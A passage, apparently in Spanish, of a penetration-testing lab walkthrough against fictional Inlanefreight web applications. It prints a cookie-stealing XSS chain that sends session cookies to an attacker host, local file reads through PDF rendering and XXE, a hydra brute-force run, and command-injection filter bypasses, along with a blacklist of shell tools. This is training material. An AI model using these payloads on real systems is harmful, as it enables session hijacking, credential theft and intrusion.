Ahora necesitamos averiguar cómo podemos robar la cookie de un administrador para que podamos iniciar sesión y ver qué tipo de acceso podemos obtener. Podemos hacer esto creando los siguientes dos archivos:

1. index.php


```r
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

2. script.js


```r
new Image().src='http://10.10.14.15:9200/index.php?c='+document.cookie
```

A continuación, inicia un servidor web PHP en tu host de ataque como sigue:



```r
sudo php -S 0.0.0.0:9200
```

Finalmente, crea un nuevo ticket y envía lo siguiente en el campo de mensaje:


```r
"><script src=http://10.10.14.15:9200/script.js></script>
```

Obtenemos una devolución de llamada en nuestro servidor web con la cookie de sesión de un administrador:



```r
sudo php -S 0.0.0.0:9200

[Tue Jun 21 00:33:27 2022] PHP 7.4.28 Development Server (http://0.0.0.0:9200) started
[Tue Jun 21 00:33:42 2022] 10.129.203.101:40102 Accepted
[Tue Jun 21 00:33:42 2022] 10.129.203.101:40102 [200]: (null) /script.js
[Tue Jun 21 00:33:42 2022] 10.129.203.101:40102 Closing
[Tue Jun 21 00:33:43 2022] 10.129.203.101:40104 Accepted
[Tue Jun 21 00:33:43 2022] 10.129.203.101:40104 [500]: GET /index.php?c=session=fcfaf93ab169bc943b92109f0a845d99

<SNIP>
```

A continuación, podemos usar un complemento de Firefox como [Cookie-Editor](https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/?utm_source=addons.mozilla.org&utm_medium=referral&utm_content=search) para iniciar sesión usando la cookie de sesión del administrador.

![text](https://academy.hackthebox.com/storage/modules/163/edit_cookie.png)

Haz clic en el botón de guardar para guardar la cookie llamada `session` y haz clic en `Login` en la parte superior derecha. Si todo funciona como se espera, seremos redirigidos a `http://support.inlanefreight.local/dashboard.php`. Tómate un tiempo y registra otro hallazgo: `Cross-Site Scripting (XSS)`, señalando que el hallazgo es de alto riesgo porque puede usarse para robar la sesión activa de un administrador y acceder al sistema de colas de tickets. Consulta el módulo [Cross-Site Scripting (XSS)](https://academy.hackthebox.com/module/details/103) para refrescar tu memoria sobre XSS y las diversas formas en que se puede aprovechar esta clase de vulnerabilidades, incluida la suplantación de sesiones.

---

## tracking.inlanefreight.local

El sitio en `http://tracking.inlanefreight.local/` nos permite ingresar un número de seguimiento y recibir un PDF que muestra el estado de nuestro pedido. La aplicación toma la entrada del usuario y genera un documento PDF. Al generar el PDF, podemos ver que el campo `Tracking #:` toma cualquier entrada (no solo números) que especifiquemos en el cuadro de búsqueda antes de hacer clic en el botón `Track Now`. Si insertamos una carga útil de JavaScript simple como `<script>document.write('TESTING THIS')</script>` y hacemos clic en `Track Now`, vemos que el PDF se genera y el mensaje `TESTING THIS` se renderiza, lo que parece significar que el código JavaScript se está ejecutando cuando el servidor web genera el documento.

![text](https://academy.hackthebox.com/storage/modules/163/tracking_rendered.png)

Notamos que también podemos inyectar HTML. Una carga útil simple como `<h1>test</h1>` se renderizará en el campo `Tracking #:` al generar el PDF también. Buscar en Google algo como `pdf HTML injection vulnerability` devuelve varios resultados interesantes como [esta publicación](https://blog.appsecco.com/finding-ssrf-via-html-injection-inside-a-pdf-file-on-aws-ec2-214cc5ec5d90) y [esta publicación](https://namratha-gm.medium.com/ssrf-to-local-file-read-through-html-injection-in-pdf-file-53711847cb2f) que discuten el aprovechamiento de la inyección de HTML, XSS y SSRF para leer archivos locales. Ahora, aunque no se cubre en el `Penetration Tester Job Role Path`, es importante tener en cuenta que a menudo encontraremos cosas nuevas durante nuestras evaluaciones.

---

## Dealing with The Unexpected

Aquí es donde la mentalidad del penetration tester es clave. Debemos ser capaces de adaptarnos, investigar y aplicar nuestra lógica para determinar lo que está sucediendo. Después de un poco de investigación, pudimos deducir que la aplicación web genera informes PDF y podemos controlar la entrada a un campo que aparentemente solo debería aceptar números. A través de un poco de investigación, pudimos identificar una clase de vulnerabilidad que puede que no estemos familiarizados, pero que hay considerable investigación y documentación al respecto. Muchos investigadores publican investigaciones extremadamente detalladas de sus propias evaluaciones o recompensas de bugs, y a menudo podemos usar esto como guía para intentar encontrar problemas similares. No hay dos evaluaciones iguales, pero solo hay tantas posibles pilas tecnológicas de aplicaciones web, por lo que estamos destinados a ver ciertas cosas una

 y otra vez, y pronto las cosas que eran nuevas y difíciles se vuelven algo natural. Vale la pena revisar el módulo [Server-side Attacks](https://academy.hackthebox.com/module/145/section/1297) para aprender más sobre SSRF y otros ataques del lado del servidor.

Examinemos algunas de estas publicaciones y veamos si podemos producir un resultado similar y obtener lectura de archivos locales. Siguiendo esta [publicación](https://namratha-gm.medium.com/ssrf-to-local-file-read-through-html-injection-in-pdf-file-53711847cb2f), probemos la lectura de archivos locales usando [XMLHttpRequest (XHR) objects](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest) y también consultando esta [excelente publicación](https://web.archive.org/web/20221207162417/https://blog.noob.ninja/local-file-read-via-xss-in-dynamically-generated-pdf/) sobre la lectura de archivos locales a través de XSS en PDF generados dinámicamente. Podemos usar esta carga útil para probar la lectura de archivos, primero probando el archivo `/etc/passwd`, que es legible por el mundo y debería confirmar la existencia de la vulnerabilidad.


```r
	<script>
	x=new XMLHttpRequest;
	x.onload=function(){  
	document.write(this.responseText)};
	x.open("GET","file:///etc/passwd");
	x.send();
	</script>
```

Pegamos la carga útil en el cuadro de búsqueda y hacemos clic en el botón `Track Now`, y el PDF recién generado muestra el contenido del archivo de vuelta, ¡así que tenemos lectura de archivos locales!

![text](https://academy.hackthebox.com/storage/modules/163/ssrf_file_read.png)

Vale la pena leer estas publicaciones en el blog, estudiar este hallazgo y su impacto, y familiarizarse con esta clase de vulnerabilidad. Si encontramos algo así durante una prueba de penetración con lo que no estamos familiarizados pero que parece "extraño", podemos referirnos al [Penetration Testing Process](https://academy.hackthebox.com/module/90/section/939) para realizar un análisis de la situación. Si investigamos y aún no podemos descubrir la vulnerabilidad, debemos mantener notas detalladas de lo que hemos intentado y nuestro proceso de pensamiento y pedir ayuda a nuestros compañeros y miembros más experimentados de nuestro equipo. Los equipos de pentesting a menudo tienen personas que se especializan o son más fuertes en ciertas áreas, por lo que alguien en el equipo probablemente ha visto esto o algo similar.

Juega con esta vulnerabilidad un poco más y ve a qué más puedes acceder. Por ahora, anotamos otro hallazgo de alto riesgo, `SSRF to Local File Read`, y seguimos adelante.

---

## vpn.inlanefreight.local

Es común encontrar portales de VPN y otros accesos remotos durante una evaluación de penetración. Esto parece ser un portal de inicio de sesión Fortinet SSL VPN. Durante las pruebas, confirmamos que la versión en uso no era vulnerable a ningún exploit conocido. Esto podría ser un excelente candidato para password spraying en una evaluación del mundo real, siempre que adoptemos un enfoque cuidadoso y medido para evitar el bloqueo de cuentas.

Probamos algunas combinaciones comunes/debiles de credenciales pero obtenemos el siguiente mensaje de error: `Access denied.`, así que podemos pasar de aquí a la siguiente aplicación.

---

## gitlab.inlanefreight.local

Muchas empresas alojan sus propias instancias de GitLab y, a veces, no las aseguran adecuadamente. Como se cubre en la sección [GitLab - Discovery & Enumeration](https://academy.hackthebox.com/module/113/section/1216) del módulo `Attacking Common Applications`, hay varios pasos que un administrador puede implementar para limitar el acceso a una instancia de GitLab, como:

- Requerir aprobación de administrador para nuevos registros
- Configurar listas de dominios permitidos para registros
- Configurar una lista de denegación

Ocasionalmente, encontraremos una instancia de GitLab que no está adecuadamente asegurada. Si podemos acceder a una instancia de GitLab, vale la pena investigar para ver qué tipo de datos podemos encontrar. Podemos descubrir archivos de configuración que contienen contraseñas, claves SSH u otra información que podría llevarnos a acceder más lejos. Después de registrarnos, podemos navegar a `/explore` para ver a qué proyectos, si hay alguno, tenemos acceso. Podemos ver que podemos acceder al proyecto `shopdev2.inlanefreight.local`, lo que nos da una pista sobre otro subdominio que no descubrimos usando la transferencia de zona DNS y que probablemente no podríamos encontrar usando la fuerza bruta de subdominios.

![text](https://academy.hackthebox.com/storage/modules/163/gitlab_explore.png)

Antes de explorar el nuevo subdominio, podemos registrar otro hallazgo de alto riesgo: `Misconfigured GitLab Instance`.

---

## shopdev2.inlanefreight.local

Nuestra enumeración de la instancia de GitLab nos llevó a otro vhost, así que primero agreguémoslo a nuestro archivo `/etc/hosts` para poder acceder a él. Navegando a `http://shopdev2.inlanefreight.local`, somos redirigidos a una página de inicio de sesión `/login.php`. Las omisiones de autenticación típicas no nos llevan a ninguna parte, así que volvemos a lo básico según la sección `Application Discovery & Enumeration` del módulo `Attacking Common Applications` y probamos algunas combinaciones de credenciales débiles. A veces, son las cosas más simples las que funcionan (y sí, vemos este tipo de cosas en producción, tanto internamente como externamente) y podemos iniciar sesión con `admin:admin`. Una vez conectados, vemos una especie de tienda en línea para la compra de productos al por mayor. Cuando vemos `dev` en una URL (especialmente orientada externamente), podemos asumir que no está listo para producción y vale la pena investigar, especialmente debido al comentario `Checkout Process not Implemented` cerca de la parte inferior de la página.

Podemos probar la búsqueda de vulnerabilidades de inyección y buscar IDOR y otros defectos, pero no encontramos nada particularmente interesante. Probemos el flujo de compra, enfocándonos en el proceso de pago del carrito de compras y capturando las solicitudes en Burp Suite. Agrega uno o dos artículos al carrito y navega a `/cart.php` y haz clic en el botón `I AGREE` para que podamos analizar la solicitud en Burp. Mirando Burp, vemos que se hace una solicitud `POST` con `XML` en el cuerpo como sigue:


```r
<?xml version="1.0" encoding="UTF-8"?>
    <root>
     <subtotal>
      undefined
     </subtotal>
     <userid>
      1206
     </userid>
    </root>
```

Piensa en el contenido del módulo, específicamente el módulo [Web Attacks](https://academy.hackthebox.com/module/134/section/1203); esto parece ser un buen candidato para `XML External Entity (XXE) Injection` porque el formulario parece estar enviando datos al servidor en formato XML. Probamos algunas cargas útiles y finalmente logramos la lectura de archivos locales para ver el contenido del archivo `/etc/passwd` con esta carga útil:


```r
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE userid [
  <!ENTITY xxetest SYSTEM "file:///etc/passwd">
]>
<root>
	<subtotal>
		undefined
	</subtotal>
	<userid>
		&xxetest;
	</userid>
</root>
```

![text](https://academy.hackthebox.com/storage/modules/163/xxe_passwd.png)

Tomemos nota de otro hallazgo de alto riesgo, `XML External Entity (XXE) Injection` (¡tenemos una buena lista hasta ahora!), y pasemos al último vhost/subdominio.

---

## monitoring.inlanefreight.local

Descubrimos el vhost `monitoring` antes, así que no repetiremos el proceso. Usamos ffuf, pero esta enumeración también se puede realizar con otras herramientas. Pruébalo con `GoBuster` para familiarizarte con más herramientas. Navegar a `http://monitoring.inlanefreight.local` resulta en una redirección a `/login.php`. Podemos probar algunas cargas útiles de omisión de autenticación y combinaciones de credenciales débiles comunes, pero no llegamos a ninguna parte, recibiendo solo el error `Invalid Credentials!` cada vez. Dado que este es un formulario de inicio de sesión, vale la pena explorarlo más a fondo para que podamos fuzzearlo un poco con Burp Intruder para ver si podemos provocar un mensaje de error indicativo de una vulnerabilidad de inyección SQL, pero no tenemos éxito.

Un análisis de la solicitud POST y la respuesta en Burp Suite no produce nada interesante. En este punto, hemos agotado casi todos los posibles ataques web y volvemos al contenido del módulo, recordando el módulo `Login Brute Forcing` que se centra en la herramienta `hydra`. Esta herramienta se puede usar para la fuerza bruta de formularios de inicio de sesión HTTP, así que probémoslo. Usaremos la misma lista de palabras del repo `SecLists` en GitHub de antes.

Configuramos `hydra` para realizar el ataque de fuerza bruta, especificando el mensaje de error `Invalid Credentials!` para filtrar los intentos de inicio de sesión no válidos. Obtenemos un éxito para el par de credenciales `admin:12qwaszx`, una contraseña común de "camino de teclado" que es fácil de recordar pero que se

 puede forzar/crackear muy fácilmente.



```r
hydra -l admin -P ./passwords.txt monitoring.inlanefreight.local http-post-form "/login.php:username=admin&password=^PASS^:Invalid Credentials!"

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-06-21 11:32:17
[DATA] max 16 tasks per 1 server, overall 16 tasks, 99 login tries (l:1/p:99), ~7 tries per task
[DATA] attacking http-post-form://monitoring.inlanefreight.local:80/login.php:username=admin&password=^PASS^:Invalid Credentials!
[80][http-post-form] host: monitoring.inlanefreight.local   login: admin   password: 12qwaszx
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-06-21 11:32:22
```

Una vez conectados, se nos presenta algún tipo de consola de monitoreo. Si escribimos `help`, se nos presenta una lista de comandos. Esto parece ser un entorno shell restringido para realizar tareas limitadas y algo muy peligroso que no debería estar expuesto externamente. La última clase de vulnerabilidades enseñada en el `Penetration Tester Job Role Path` que aún no hemos cubierto es [Command Injections](https://academy.hackthebox.com/module/details/109).

![text](https://academy.hackthebox.com/storage/modules/163/monitoring.png)

Recorremos cada uno de los comandos. Intentar `cat /etc/passwd` no funciona, por lo que parece que estamos realmente en un entorno restringido. `whoami` y `date` nos proporcionan información básica. No queremos reiniciar el objetivo y causar una interrupción del servicio. No podemos cambiar de directorio (`cd`) a otros directorios. Escribir `ls` nos muestra algunos archivos que probablemente estén almacenados en el directorio al que actualmente estamos restringidos.

![text](https://academy.hackthebox.com/storage/modules/163/monitoring_files.png)

Mirando los archivos, encontramos un servicio de autenticación y también que estamos dentro de un contenedor. La última opción en la lista es `connection_test`. Escribir eso da un mensaje de `Success` y nada más. Volviendo a Burp Suite y proxyando la solicitud, vemos que se hace una solicitud `GET` a `/ping.php` para la IP localhost `127.0.0.1`, y la respuesta HTTP muestra un solo ataque ping exitoso. Podemos inferir que el script `/ping.php` está ejecutando un comando del sistema operativo usando una función PHP como `shell_exec(ping -c 1 127.0.0.1)` o quizás similar usando la función [system()](https://www.php.net/manual/en/function.system.php) para ejecutar un comando. Si este script está codificado incorrectamente, podría resultar fácilmente en una vulnerabilidad de inyección de comandos, así que probemos algunas cargas útiles comunes.

Parece haber algún tipo de filtrado en juego porque probar cargas útiles estándar como `GET /ping.php?ip=%127.0.0.1;id` y `GET /ping.php?ip=%127.0.0.1|id` resulta en un error de `Invalid input`, lo que significa que probablemente haya una lista negra de caracteres en juego. Podemos eludir este filtro usando un carácter de nueva línea `%0A` (o carácter de salto de línea) como nuestro operador de inyección siguiendo la metodología discutida en la sección [Bypassing Space Filters](https://academy.hackthebox.com/module/109/section/1036). Podemos hacer una solicitud agregando el carácter de nueva línea como `GET /ping.php?ip=127.0.0.1%0a`, y el ping aún es exitoso, lo que significa que el carácter no está en la lista negra.

Hemos ganado la primera batalla, pero parece que hay otro tipo de filtro en juego, ya que probar algo como `GET /ping.php?ip=127.0.0.1%0aid` aún resulta en un error de `Invalid input`. A continuación, podemos jugar con la sintaxis del comando y ver que podemos eludir el segundo filtro usando comillas simples. Cambiando a `cURL`, podemos ejecutar el comando `id` de la siguiente manera:



```r
curl "http://monitoring.inlanefreight.local/ping.php?ip=127.0.0.1%0a'i'd"

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.045 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.045/0.045/0.045/0.000 ms
uid=1004(webdev) gid=1004(webdev) groups=1004(webdev),4(adm)
```

Hemos logrado la ejecución de comandos como el usuario `webdev`. Investigando un poco más, vemos que este host tiene múltiples direcciones IP, una de las cuales lo coloca dentro de la red `172.16.8.0/23` que era parte del alcance inicial. Si podemos obtener acceso estable a este host, podríamos pivotar a la red interna y comenzar a atacar el dominio de Active Directory.



```r
curl "http://monitoring.inlanefreight.local/ping.php?ip=127.0.0.1%0a'i'fconfig"

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.048 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.048/0.048/0.048/0.000 ms

<SNIP>

ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.203.101  netmask 255.255.0.0  broadcast 10.129.255.255
        inet6 dead:beef::250:56ff:feb9:67a5  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::250:56ff:feb9:67a5  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b9:67:a5  txqueuelen 1000  (Ethernet)
        RX packets 10055  bytes 1041358 (1.0 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2316  bytes 4030180 (4.0 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.8.120  netmask 255.255.254.0  broadcast 172.16.255.255
        inet6 fe80::250:56ff:feb9:a62d  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b9:a6:2d  txqueuelen 1000  (Ethernet)
        RX packets 21515  bytes 1890242 (1.8 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 15  bytes 1146 (1.1 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

Nuestro próximo desafío es encontrar una forma de obtener un shell inverso. Podemos ejecutar comandos individuales, pero cualquier cosa con un espacio no funciona. Volviendo a la sección [Bypassing Space Filters](https://academy.hackthebox.com/module/109/section/1036) del módulo `Command Injections`, recordamos que podemos usar la `($IFS) Linux Environment Variable` para eludir las restricciones de espacio. Podemos combinar esto con la elusión de caracteres de nueva línea y comenzar a enumerar formas de obtener un shell inverso. Para ayudarnos, echemos un vistazo al archivo `ping.php` para entender qué se está filtrando para que podamos limitar la cantidad de conjeturas necesarias.

Cambiando a Burp y haciendo la solicitud `GET /ping.php?ip=127.0.0.1%0a'c'at${IFS}ping.php`, o similar, nos muestra el contenido del archivo, y podemos trabajar en superar el filtro y encontrar una manera de establecer un shell inverso.


```r


<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
$output = '';

function filter($str)
{
  $operators = ['&', '|', ';', '\\', '/', ' '];
  foreach ($operators as $operator) {
    if (strpos($str, $operator)) {
      return true;
    }
  }
  $words = ['whoami', 'echo', 'rm', 'mv', 'cp', 'id', 'curl', 'wget', 'cd', 'sudo', 'mkdir', 'man', 'history', 'ln', 'grep', 'pwd', 'file', 'find', 'kill', 'ps', 'uname', 'hostname', 'date', 'uptime', 'lsof', 'ifconfig', 'ipconfig', 'ip', 'tail', 'netstat', 'tar', 'apt', 'ssh', 'scp', 'less', 'more', 'awk', 'head', 'sed', 'nc', 'netcat'];
  foreach ($words as $word) {
    if (strpos($str, $word) !== false) {
      return true;
    }
  }

  return false;
}

if (isset($_GET['ip'])) {
  $ip = $_GET['ip'];
  if (filter($ip)) {
    $output = "Invalid input";
  } else {
    $cmd = "bash -c 'ping -c 1 " . $ip . "'";
    $output = shell_exec($cmd);
  }
}
?>
<?php
echo $output;
?>
```

Podemos ver que la mayoría de las opciones para obtener un shell inverso están filtradas, lo que hará las cosas difíciles; sin embargo, una que no está es `socat`. Socat es una herramienta versátil que se puede usar para capturar shells, e incluso pivotar como hemos visto en el módulo [Pivoting, Tunneling, and Port Forwarding](https://academy.hackthebox.com/module/details/158). Veamos si está disponible para nosotros en el sistema. Volviendo a Burp y usando la solicitud `GET /ping.php?ip=127.0.0.1%0a'w'h'i'ch${IFS}socat` nos muestra que está en el sistema, ubicado en `/usr/bin/socat`.

![text](https://academy.hackthebox.com/storage/modules/163/socat_check.png)

---

## Next Steps

Ahora que finalmente hemos trabajado en todos los servicios y aplicaciones web orientadas externamente, tenemos una buena idea de nuestros próximos pasos. En la siguiente sección, trabajaremos en establecer un shell inverso en el entorno interno y en escalar nuestros privilegios para establecer algún tipo de persistencia en el host objetivo.